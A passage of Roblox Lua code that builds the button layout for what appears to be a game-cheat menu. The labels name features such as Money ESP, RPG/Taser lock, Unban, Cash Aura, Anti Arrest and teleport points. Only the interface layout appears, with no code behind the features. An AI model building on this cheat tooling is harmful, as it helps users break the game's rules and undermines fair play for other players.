Invisible.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
Invisible.Size = UDim2.new(0, 94, 0, 46)
Invisible.Font = Enum.Font.SourceSansBold
Invisible.Text = "Invisible"
Invisible.TextColor3 = Color3.fromRGB(255, 255, 255)
Invisible.TextSize = 20.000

LastingBullets.Name = "LastingBullets"
LastingBullets.Parent = ButtonHolder_2
LastingBullets.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
LastingBullets.BorderSizePixel = 0
LastingBullets.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
LastingBullets.Size = UDim2.new(0, 94, 0, 46)
LastingBullets.Font = Enum.Font.SourceSansBold
LastingBullets.Text = "LastingBullets"
LastingBullets.TextColor3 = Color3.fromRGB(255, 255, 255)
LastingBullets.TextSize = 20.000

MoneyESP.Name = "MoneyESP"
MoneyESP.Parent = ButtonHolder_2
MoneyESP.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MoneyESP.BorderSizePixel = 0
MoneyESP.Position = UDim2.new(0.024917312, 0, 0.221326202, 0)
MoneyESP.Size = UDim2.new(0, 94, 0, 46)
MoneyESP.Font = Enum.Font.SourceSansBold
MoneyESP.Text = "MoneyESP"
MoneyESP.TextColor3 = Color3.fromRGB(255, 255, 255)
MoneyESP.TextSize = 20.000

RpgLock.Name = "RpgLock"
RpgLock.Parent = ButtonHolder_2
RpgLock.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
RpgLock.BorderSizePixel = 0
RpgLock.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
RpgLock.Size = UDim2.new(0, 94, 0, 46)
RpgLock.Font = Enum.Font.SourceSansBold
RpgLock.Text = "RpgLock"
RpgLock.TextColor3 = Color3.fromRGB(255, 255, 255)
RpgLock.TextSize = 20.000

Spin.Name = "Spin"
Spin.Parent = ButtonHolder_2
Spin.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Spin.BorderSizePixel = 0
Spin.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
Spin.Size = UDim2.new(0, 94, 0, 46)
Spin.Font = Enum.Font.SourceSansBold
Spin.Text = "Spin"
Spin.TextColor3 = Color3.fromRGB(255, 255, 255)
Spin.TextSize = 20.000

TaserLock.Name = "TaserLock"
TaserLock.Parent = ButtonHolder_2
TaserLock.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TaserLock.BorderSizePixel = 0
TaserLock.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
TaserLock.Size = UDim2.new(0, 94, 0, 46)
TaserLock.Font = Enum.Font.SourceSansBold
TaserLock.Text = "TaserLock"
TaserLock.TextColor3 = Color3.fromRGB(255, 255, 255)
TaserLock.TextSize = 20.000

Unban.Name = "Unban"
Unban.Parent = ButtonHolder_2
Unban.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Unban.BorderSizePixel = 0
Unban.Position = UDim2.new(0.677926719, 0, 0.762864709, 0)
Unban.Size = UDim2.new(0, 94, 0, 46)
Unban.Font = Enum.Font.SourceSansBold
Unban.Text = "Unban"
Unban.TextColor3 = Color3.fromRGB(255, 255, 255)
Unban.TextSize = 20.000

Users.Name = "Users"
Users.Parent = ButtonHolder_2
Users.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Users.BorderSizePixel = 0
Users.Position = UDim2.new(0.0251458082, 0, 0.0399999991, 0)
Users.Size = UDim2.new(0, 94, 0, 46)
Users.Font = Enum.Font.SourceSansBold
Users.Text = "Users"
Users.TextColor3 = Color3.fromRGB(255, 255, 255)
Users.TextSize = 20.000

TogglesPage.Name = "TogglesPage"
TogglesPage.Parent = PageContainer
TogglesPage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TogglesPage.BackgroundTransparency = 1.000
TogglesPage.BorderSizePixel = 0
TogglesPage.Size = UDim2.new(0, 405, 0, 311)
TogglesPage.Visible = false

PageTitle_4.Name = "PageTitle"
PageTitle_4.Parent = TogglesPage
PageTitle_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PageTitle_4.BackgroundTransparency = 1.000
PageTitle_4.Position = UDim2.new(0.0225298852, 0, -0.000382794446, 0)
PageTitle_4.Size = UDim2.new(0, 148, 0, 20)
PageTitle_4.Font = Enum.Font.SourceSansBold
PageTitle_4.Text = "Toggles"
PageTitle_4.TextColor3 = Color3.fromRGB(255, 255, 255)
PageTitle_4.TextSize = 15.000
PageTitle_4.TextWrapped = true
PageTitle_4.TextXAlignment = Enum.TextXAlignment.Left

ButtonHolder_3.Name = "ButtonHolder"
ButtonHolder_3.Parent = TogglesPage
ButtonHolder_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ButtonHolder_3.BackgroundTransparency = 1.000
ButtonHolder_3.Position = UDim2.new(0.0345679, 0, 0.0675241128, 0)
ButtonHolder_3.Size = UDim2.new(0, 376, 0, 275)

UIGridLayout_3.Parent = ButtonHolder_3
UIGridLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout_3.CellSize = UDim2.new(0, 120, 0, 35)

Toggle.Name = "Toggle"
Toggle.Parent = ButtonHolder_3
Toggle.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Toggle.BorderSizePixel = 0
Toggle.Size = UDim2.new(0, 100, 0, 100)

AntiSlowColor.Name = "AntiSlowColor"
AntiSlowColor.Parent = Toggle
AntiSlowColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiSlowColor.BorderSizePixel = 0
AntiSlowColor.Size = UDim2.new(0, 8, 0, 35)

AntiSlow.Name = "AntiSlow"
AntiSlow.Parent = Toggle
AntiSlow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AntiSlow.BackgroundTransparency = 1.000
AntiSlow.Position = UDim2.new(0.0666666701, 0, 0, 0)
AntiSlow.Size = UDim2.new(0, 112, 0, 35)
AntiSlow.AutoButtonColor = false
AntiSlow.Font = Enum.Font.SourceSansBold
AntiSlow.Text = " AntiSlow"
AntiSlow.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiSlow.TextSize = 25.000

Toggle_2.Name = "Toggle"
Toggle_2.Parent = ButtonHolder_3
Toggle_2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Toggle_2.BorderSizePixel = 0
Toggle_2.Size = UDim2.new(0, 100, 0, 100)

CashAuraColor.Name = "CashAuraColor"
CashAuraColor.Parent = Toggle_2
CashAuraColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CashAuraColor.BorderSizePixel = 0
CashAuraColor.Size = UDim2.new(0, 8, 0, 35)

CashAura.Name = "CashAura"
CashAura.Parent = Toggle_2
CashAura.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CashAura.BackgroundTransparency = 1.000
CashAura.Position = UDim2.new(0.0666666701, 0, 0, 0)
CashAura.Size = UDim2.new(0, 112, 0, 35)
CashAura.AutoButtonColor = false
CashAura.Font = Enum.Font.SourceSansBold
CashAura.Text = "Cash Aura"
CashAura.TextColor3 = Color3.fromRGB(255, 255, 255)
CashAura.TextSize = 25.000

Toggle_3.Name = "Toggle"
Toggle_3.Parent = ButtonHolder_3
Toggle_3.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Toggle_3.BorderSizePixel = 0
Toggle_3.Size = UDim2.new(0, 100, 0, 100)
Toggle_3.Visible = false

AntiStompColor.Name = "AntiStompColor"
AntiStompColor.Parent = Toggle_3
AntiStompColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiStompColor.BorderSizePixel = 0
AntiStompColor.Size = UDim2.new(0, 8, 0, 35)

AntiStomp.Name = "AntiStomp"
AntiStomp.Parent = Toggle_3
AntiStomp.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AntiStomp.BackgroundTransparency = 1.000
AntiStomp.Position = UDim2.new(0.0666666701, 0, 0, 0)
AntiStomp.Size = UDim2.new(0, 112, 0, 35)
AntiStomp.AutoButtonColor = false
AntiStomp.Font = Enum.Font.SourceSansBold
AntiStomp.Text = "Anti Stomp"
AntiStomp.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiStomp.TextSize = 25.000

Toggle_4.Name = "Toggle"
Toggle_4.Parent = ButtonHolder_3
Toggle_4.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Toggle_4.BorderSizePixel = 0
Toggle_4.Size = UDim2.new(0, 100, 0, 100)

AutoBlockColor.Name = "AutoBlockColor"
AutoBlockColor.Parent = Toggle_4
AutoBlockColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AutoBlockColor.BorderSizePixel = 0
AutoBlockColor.Size = UDim2.new(0, 8, 0, 35)

AutoBlock.Name = "AutoBlock"
AutoBlock.Parent = Toggle_4
AutoBlock.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AutoBlock.BackgroundTransparency = 1.000
AutoBlock.Position = UDim2.new(0.0666666701, 0, 0, 0)
AutoBlock.Size = UDim2.new(0, 112, 0, 35)
AutoBlock.AutoButtonColor = false
AutoBlock.Font = Enum.Font.SourceSansBold
AutoBlock.Text = "Auto Block"
AutoBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoBlock.TextSize = 25.000

Toggle_5.Name = "Toggle"
Toggle_5.Parent = ButtonHolder_3
Toggle_5.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Toggle_5.BorderSizePixel = 0
Toggle_5.Size = UDim2.new(0, 100, 0, 100)

AutoStompColor.Name = "AutoStompColor"
AutoStompColor.Parent = Toggle_5
AutoStompColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AutoStompColor.BorderSizePixel = 0
AutoStompColor.Size = UDim2.new(0, 8, 0, 35)

AutoStomp.Name = "AutoStomp"
AutoStomp.Parent = Toggle_5
AutoStomp.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AutoStomp.BackgroundTransparency = 1.000
AutoStomp.Position = UDim2.new(0.0666666701, 0, 0, 0)
AutoStomp.Size = UDim2.new(0, 112, 0, 35)
AutoStomp.AutoButtonColor = false
AutoStomp.Font = Enum.Font.SourceSansBold
AutoStomp.Text = "Auto Stomp"
AutoStomp.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoStomp.TextSize = 25.000

Toggle_6.Name = "Toggle"
Toggle_6.Parent = ButtonHolder_3
Toggle_6.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Toggle_6.BorderSizePixel = 0
Toggle_6.Size = UDim2.new(0, 100, 0, 100)
Toggle_6.Visible = false

AntiArrestColor.Name = "AntiArrestColor"
AntiArrestColor.Parent = Toggle_6
AntiArrestColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiArrestColor.BorderSizePixel = 0
AntiArrestColor.Size = UDim2.new(0, 8, 0, 35)

AntiArrest.Name = "AntiArrest"
AntiArrest.Parent = Toggle_6
AntiArrest.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AntiArrest.BackgroundTransparency = 1.000
AntiArrest.Position = UDim2.new(0.0666666701, 0, 0, 0)
AntiArrest.Size = UDim2.new(0, 112, 0, 35)
AntiArrest.AutoButtonColor = false
AntiArrest.Font = Enum.Font.SourceSansBold
AntiArrest.Text = "Anti Arrest"
AntiArrest.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiArrest.TextSize = 25.000

Toggle_7.Name = "Toggle"
Toggle_7.Parent = ButtonHolder_3
Toggle_7.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Toggle_7.BorderSizePixel = 0
Toggle_7.Size = UDim2.new(0, 100, 0, 100)

AutoDropColor.Name = "AutoDropColor"
AutoDropColor.Parent = Toggle_7
AutoDropColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AutoDropColor.BorderSizePixel = 0
AutoDropColor.Size = UDim2.new(0, 8, 0, 35)

AutoDrop.Name = "AutoDrop"
AutoDrop.Parent = Toggle_7
AutoDrop.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AutoDrop.BackgroundTransparency = 1.000
AutoDrop.Position = UDim2.new(0.0666666701, 0, 0, 0)
AutoDrop.Size = UDim2.new(0, 112, 0, 35)
AutoDrop.AutoButtonColor = false
AutoDrop.Font = Enum.Font.SourceSansBold
AutoDrop.Text = "Auto Drop"
AutoDrop.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoDrop.TextSize = 25.000

Toggle_8.Name = "Toggle"
Toggle_8.Parent = ButtonHolder_3
Toggle_8.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Toggle_8.BorderSizePixel = 0
Toggle_8.Size = UDim2.new(0, 100, 0, 100)

RocketRideColor.Name = "RocketRideColor"
RocketRideColor.Parent = Toggle_8
RocketRideColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
RocketRideColor.BorderSizePixel = 0
RocketRideColor.Size = UDim2.new(0, 8, 0, 35)

RocketRide.Name = "RocketRide"
RocketRide.Parent = Toggle_8
RocketRide.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RocketRide.BackgroundTransparency = 1.000
RocketRide.Position = UDim2.new(0.0666666701, 0, 0, 0)
RocketRide.Size = UDim2.new(0, 112, 0, 35)
RocketRide.AutoButtonColor = false
RocketRide.Font = Enum.Font.SourceSansBold
RocketRide.Text = "Rocket Ride"
RocketRide.TextColor3 = Color3.fromRGB(255, 255, 255)
RocketRide.TextSize = 25.000

Toggle_9.Name = "Toggle"
Toggle_9.Parent = ButtonHolder_3
Toggle_9.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Toggle_9.BorderSizePixel = 0
Toggle_9.Size = UDim2.new(0, 100, 0, 100)

AntiGrabColor.Name = "AntiGrabColor"
AntiGrabColor.Parent = Toggle_9
AntiGrabColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiGrabColor.BorderSizePixel = 0
AntiGrabColor.Size = UDim2.new(0, 8, 0, 35)

AntiGrab.Name = "AntiGrab"
AntiGrab.Parent = Toggle_9
AntiGrab.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AntiGrab.BackgroundTransparency = 1.000
AntiGrab.Position = UDim2.new(0.0666666701, 0, 0, 0)
AntiGrab.Size = UDim2.new(0, 112, 0, 35)
AntiGrab.AutoButtonColor = false
AntiGrab.Font = Enum.Font.SourceSansBold
AntiGrab.Text = "Anti Grab"
AntiGrab.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiGrab.TextSize = 25.000

Toggle_10.Name = "Toggle"
Toggle_10.Parent = ButtonHolder_3
Toggle_10.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Toggle_10.BorderSizePixel = 0
Toggle_10.Size = UDim2.new(0, 100, 0, 100)

HideUserColor.Name = "HideUserColor"
HideUserColor.Parent = Toggle_10
HideUserColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
HideUserColor.BorderSizePixel = 0
HideUserColor.Size = UDim2.new(0, 8, 0, 35)

HideUser.Name = "HideUser"
HideUser.Parent = Toggle_10
HideUser.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HideUser.BackgroundTransparency = 1.000
HideUser.Position = UDim2.new(0.0666666701, 0, 0, 0)
HideUser.Size = UDim2.new(0, 112, 0, 35)
HideUser.AutoButtonColor = false
HideUser.Font = Enum.Font.SourceSansBold
HideUser.Text = "Hide User"
HideUser.TextColor3 = Color3.fromRGB(255, 255, 255)
HideUser.TextSize = 25.000

Toggle_11.Name = "Toggle"
Toggle_11.Parent = ButtonHolder_3
Toggle_11.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Toggle_11.BorderSizePixel = 0
Toggle_11.Size = UDim2.new(0, 100, 0, 100)

QToTpColor.Name = "QToTpColor"
QToTpColor.Parent = Toggle_11
QToTpColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
QToTpColor.BorderSizePixel = 0
QToTpColor.Size = UDim2.new(0, 8, 0, 35)

QToTp.Name = "QToTp"
QToTp.Parent = Toggle_11
QToTp.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
QToTp.BackgroundTransparency = 1.000
QToTp.Position = UDim2.new(0.0666666701, 0, 0, 0)
QToTp.Size = UDim2.new(0, 112, 0, 35)
QToTp.AutoButtonColor = false
QToTp.Font = Enum.Font.SourceSansBold
QToTp.Text = "Q to tp"
QToTp.TextColor3 = Color3.fromRGB(255, 255, 255)
QToTp.TextSize = 25.000

Toggle_12.Name = "Toggle"
Toggle_12.Parent = ButtonHolder_3
Toggle_12.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Toggle_12.BorderSizePixel = 0
Toggle_12.Size = UDim2.new(0, 100, 0, 100)

HideBlockColor.Name = "HideBlockColor"
HideBlockColor.Parent = Toggle_12
HideBlockColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
HideBlockColor.BorderSizePixel = 0
HideBlockColor.Size = UDim2.new(0, 8, 0, 35)

HideBlock.Name = "HideBlock"
HideBlock.Parent = Toggle_12
HideBlock.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HideBlock.BackgroundTransparency = 1.000
HideBlock.Position = UDim2.new(0.0666666701, 0, 0, 0)
HideBlock.Size = UDim2.new(0, 112, 0, 35)
HideBlock.AutoButtonColor = false
HideBlock.Font = Enum.Font.SourceSansBold
HideBlock.Text = "Hide Block"
HideBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
HideBlock.TextSize = 25.000

Toggle_13.Name = "Toggle"
Toggle_13.Parent = ButtonHolder_3
Toggle_13.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Toggle_13.BorderSizePixel = 0
Toggle_13.Size = UDim2.new(0, 100, 0, 100)

AntiEffectsColor.Name = "AntiEffectsColor"
AntiEffectsColor.Parent = Toggle_13
AntiEffectsColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiEffectsColor.BorderSizePixel = 0
AntiEffectsColor.Size = UDim2.new(0, 8, 0, 35)

AntiEffects.Name = "AntiEffects"
AntiEffects.Parent = Toggle_13
AntiEffects.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AntiEffects.BackgroundTransparency = 1.000
AntiEffects.Position = UDim2.new(0.0666666701, 0, 0, 0)
AntiEffects.Size = UDim2.new(0, 112, 0, 35)
AntiEffects.AutoButtonColor = false
AntiEffects.Font = Enum.Font.SourceSansBold
AntiEffects.Text = "Anti Effects"
AntiEffects.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiEffects.TextSize = 25.000

Toggle_14.Name = "Toggle"
Toggle_14.Parent = ButtonHolder_3
Toggle_14.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Toggle_14.BorderSizePixel = 0
Toggle_14.Size = UDim2.new(0, 100, 0, 100)

AltArmorColor.Name = "AltArmorColor"
AltArmorColor.Parent = Toggle_14
AltArmorColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AltArmorColor.BorderSizePixel = 0
AltArmorColor.Size = UDim2.new(0, 8, 0, 35)

AltArmor.Name = "AltArmor"
AltArmor.Parent = Toggle_14
AltArmor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AltArmor.BackgroundTransparency = 1.000
AltArmor.Position = UDim2.new(0.0666666701, 0, 0, 0)
AltArmor.Size = UDim2.new(0, 112, 0, 35)
AltArmor.AutoButtonColor = false
AltArmor.Font = Enum.Font.SourceSansBold
AltArmor.Text = "Alt Armor"
AltArmor.TextColor3 = Color3.fromRGB(255, 255, 255)
AltArmor.TextSize = 25.000

Toggle_15.Name = "Toggle"
Toggle_15.Parent = ButtonHolder_3
Toggle_15.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Toggle_15.BorderSizePixel = 0
Toggle_15.Size = UDim2.new(0, 100, 0, 100)

AntiBagColor.Name = "AntiBagColor"
AntiBagColor.Parent = Toggle_15
AntiBagColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiBagColor.BorderSizePixel = 0
AntiBagColor.Size = UDim2.new(0, 8, 0, 35)

AntiBag.Name = "AntiBag"
AntiBag.Parent = Toggle_15
AntiBag.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AntiBag.BackgroundTransparency = 1.000
AntiBag.Position = UDim2.new(0.0666666701, 0, 0, 0)
AntiBag.Size = UDim2.new(0, 112, 0, 35)
AntiBag.AutoButtonColor = false
AntiBag.Font = Enum.Font.SourceSansBold
AntiBag.Text = "Anti Bag"
AntiBag.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiBag.TextSize = 25.000

QuickTpPage.Name = "QuickTpPage"
QuickTpPage.Parent = PageContainer
QuickTpPage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
QuickTpPage.BackgroundTransparency = 1.000
QuickTpPage.BorderSizePixel = 0
QuickTpPage.Size = UDim2.new(0, 405, 0, 311)
QuickTpPage.Visible = false

PageTitle_5.Name = "PageTitle"
PageTitle_5.Parent = QuickTpPage
PageTitle_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PageTitle_5.BackgroundTransparency = 1.000
PageTitle_5.Position = UDim2.new(0.0225298852, 0, -0.000382794446, 0)
PageTitle_5.Size = UDim2.new(0, 148, 0, 20)
PageTitle_5.Font = Enum.Font.SourceSansBold
PageTitle_5.Text = "Quick Tp"
PageTitle_5.TextColor3 = Color3.fromRGB(255, 255, 255)
PageTitle_5.TextSize = 15.000
PageTitle_5.TextWrapped = true
PageTitle_5.TextXAlignment = Enum.TextXAlignment.Left

ButtonHolder_4.Name = "ButtonHolder"
ButtonHolder_4.Parent = QuickTpPage
ButtonHolder_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ButtonHolder_4.BackgroundTransparency = 1.000
ButtonHolder_4.Position = UDim2.new(0.0345679, 0, 0.0675241128, 0)
ButtonHolder_4.Size = UDim2.new(0, 376, 0, 275)

UIGridLayout_4.Parent = ButtonHolder_4
UIGridLayout_4.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout_4.CellSize = UDim2.new(0, 120, 0, 50)

Bank.Name = "Bank"
Bank.Parent = ButtonHolder_4
Bank.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Bank.BorderSizePixel = 0
Bank.Position = UDim2.new(0.024917312, 0, 0.221326202, 0)
Bank.Size = UDim2.new(0, 94, 0, 46)
Bank.Font = Enum.Font.SourceSansBold
Bank.Text = "Bank"
Bank.TextColor3 = Color3.fromRGB(255, 255, 255)
Bank.TextSize = 20.000

GasStation.Name = "GasStation"
GasStation.Parent = ButtonHolder_4
GasStation.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
GasStation.BorderSizePixel = 0
GasStation.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
GasStation.Size = UDim2.new(0, 94, 0, 46)
GasStation.Font = Enum.Font.SourceSansBold
GasStation.Text = "GasStation"
GasStation.TextColor3 = Color3.fromRGB(255, 255, 255)
GasStation.TextSize = 20.000

GunShop1.Name = "GunShop1"
GunShop1.Parent = ButtonHolder_4
GunShop1.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
GunShop1.BorderSizePixel = 0
GunShop1.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
GunShop1.Size = UDim2.new(0, 94, 0, 46)
GunShop1.Font = Enum.Font.SourceSansBold
GunShop1.Text = "GunShop(AK)"
GunShop1.TextColor3 = Color3.fromRGB(255, 255, 255)
GunShop1.TextSize = 20.000

GunShop2.Name = "GunShop2"
GunShop2.Parent = ButtonHolder_4
GunShop2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
GunShop2.BorderSizePixel = 0
GunShop2.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
GunShop2.Size = UDim2.new(0, 94, 0, 46)
GunShop2.Font = Enum.Font.SourceSansBold
GunShop2.Text = "GunShop(UP)"
GunShop2.TextColor3 = Color3.fromRGB(255, 255, 255)
GunShop2.TextSize = 20.000

LavaBase.Name = "LavaBase"
LavaBase.Parent = ButtonHolder_4
LavaBase.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
LavaBase.BorderSizePixel = 0
LavaBase.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
LavaBase.Size = UDim2.new(0, 94, 0, 46)
LavaBase.Font = Enum.Font.SourceSansBold
LavaBase.Text = "LavaBase"
LavaBase.TextColor3 = Color3.fromRGB(255, 255, 255)
LavaBase.TextSize = 20.000

LoadPos.Name = "LoadPos"
LoadPos.Parent = ButtonHolder_4
LoadPos.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
LoadPos.BorderSizePixel = 0
LoadPos.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
LoadPos.Size = UDim2.new(0, 94, 0, 46)
LoadPos.Font = Enum.Font.SourceSansBold
LoadPos.Text = "LoadPos"
LoadPos.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadPos.TextSize = 20.000

Playground.Name = "Playground"
Playground.Parent = ButtonHolder_4
Playground.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Playground.BorderSizePixel = 0
Playground.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
Playground.Size = UDim2.new(0, 94, 0, 46)
Playground.Font = Enum.Font.SourceSansBold
Playground.Text = "Playground"
Playground.TextColor3 = Color3.fromRGB(255, 255, 255)
Playground.TextSize = 20.000

PrevPosition.Name = "PrevPosition"
PrevPosition.Parent = ButtonHolder_4
PrevPosition.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
PrevPosition.BorderSizePixel = 0
PrevPosition.Position = UDim2.new(0.0251458082, 0, 0.0399999991, 0)
PrevPosition.Size = UDim2.new(0, 94, 0, 46)
PrevPosition.Font = Enum.Font.SourceSansBold
PrevPosition.Text = "PrevPos"
PrevPosition.TextColor3 = Color3.fromRGB(255, 255, 255)
PrevPosition.TextSize = 20.000

SafeZone1.Name = "SafeZone1"
SafeZone1.Parent = ButtonHolder_4
SafeZone1.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
SafeZone1.BorderSizePixel = 0
SafeZone1.Position = UDim2.new(0.0218890235, 0, 0.762864709, 0)
SafeZone1.Size = UDim2.new(0, 94, 0, 46)
SafeZone1.Font = Enum.Font.SourceSansBold
SafeZone1.Text = "Safe Zone #1"
SafeZone1.TextColor3 = Color3.fromRGB(255, 255, 255)
SafeZone1.TextSize = 20.000

SafeZone2.Name = "SafeZone2"
SafeZone2.Parent = ButtonHolder_4
SafeZone2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
SafeZone2.BorderSizePixel = 0
SafeZone2.Position = UDim2.new(0.677926719, 0, 0.762864709, 0)
SafeZone2.Size = UDim2.new(0, 94, 0, 46)
SafeZone2.Font = Enum.Font.SourceSansBold
SafeZone2.Text = "Safe Zone #2"
SafeZone2.TextColor3 = Color3.fromRGB(255, 255, 255)
SafeZone2.TextSize = 20.000

SavePos.Name = "SavePos"
SavePos.Parent = ButtonHolder_4
SavePos.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
SavePos.BorderSizePixel = 0
SavePos.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
SavePos.Size = UDim2.new(0, 94, 0, 46)
SavePos.Font = Enum.Font.SourceSansBold
SavePos.Text = "SavePos"
SavePos.TextColor3 = Color3.fromRGB(255, 255, 255)
SavePos.TextSize = 20.000

SetSpawn.Name = "SetSpawn"
SetSpawn.Parent = ButtonHolder_4
SetSpawn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
SetSpawn.BorderSizePixel = 0
SetSpawn.Position = UDim2.new(0.351977378, 0, 0.762864709, 0)
SetSpawn.Size = UDim2.new(0, 94, 0, 46)
SetSpawn.Font = Enum.Font.SourceSansBold
SetSpawn.Text = "SetSpawn"
SetSpawn.TextColor3 = Color3.fromRGB(255, 255, 255)
SetSpawn.TextSize = 20.000

Sewer.Name = "Sewer"
Sewer.Parent = ButtonHolder_4
Sewer.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Sewer.BorderSizePixel = 0
Sewer.Position = UDim2.new(0.352205783, 0, 0.409230769, 0)
Sewer.Size = UDim2.new(0, 94, 0, 46)
Sewer.Font = Enum.Font.SourceSansBold
Sewer.Text = "Sewer"
Sewer.TextColor3 = Color3.fromRGB(255, 255, 255)
Sewer.TextSize = 20.000

TacoShop.Name = "TacoShop"
TacoShop.Parent = ButtonHolder_4
TacoShop.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TacoShop.BorderSizePixel = 0
TacoShop.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
TacoShop.Size = UDim2.new(0, 94, 0, 46)
TacoShop.Font = Enum.Font.SourceSansBold
TacoShop.Text = "TacoShop"
TacoShop.TextColor3 = Color3.fromRGB(255, 255, 255)
TacoShop.TextSize = 20.000

UFO.Name = "UFO"
UFO.Parent = ButtonHolder_4
UFO.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
UFO.BorderSizePixel = 0
UFO.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
UFO.Size = UDim2.new(0, 94, 0, 46)
UFO.Font = Enum.Font.SourceSansBold
UFO.Text = "UFO"
UFO.TextColor3 = Color3.fromRGB(255, 255, 255)
UFO.TextSize = 20.000

SellingToolsPage.Name = "SellingToolsPage"
SellingToolsPage.Parent = PageContainer
SellingToolsPage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SellingToolsPage.BackgroundTransparency = 1.000
SellingToolsPage.BorderSizePixel = 0
SellingToolsPage.Size = UDim2.new(0, 405, 0, 311)
SellingToolsPage.Visible = false

PageTitle_6.Name = "PageTitle"
PageTitle_6.Parent = SellingToolsPage
PageTitle_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PageTitle_6.BackgroundTransparency = 1.000
PageTitle_6.Position = UDim2.new(0.0200607497, 0, 0.0446332805, 0)
PageTitle_6.Size = UDim2.new(0, 395, 0, 45)
PageTitle_6.Font = Enum.Font.SourceSansBold
PageTitle_6.Text = "Selling Tools"
